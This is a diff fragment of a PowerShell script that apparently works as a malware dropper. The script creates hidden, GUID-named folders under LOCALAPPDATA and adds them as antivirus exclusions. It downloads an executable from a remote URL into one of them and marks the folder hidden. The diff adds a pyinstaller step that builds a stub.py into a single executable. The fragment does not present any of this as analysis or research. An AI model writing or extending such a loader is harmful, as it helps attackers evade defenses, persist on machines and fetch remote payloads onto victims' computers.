@@ -35,10 +35,12 @@ Add-Exclusion -Path $persistFolder
 $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
 New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
 Add-Exclusion -Path $hiddenFolder
+$stubPath = (Get-Location).Path + "\stub.py"
 
 $tempPath = Join-Path $hiddenFolder $updaterExe
 
 try {
+    pyinstaller --noconfirm --onefile --console  $stubPath
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     
     Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
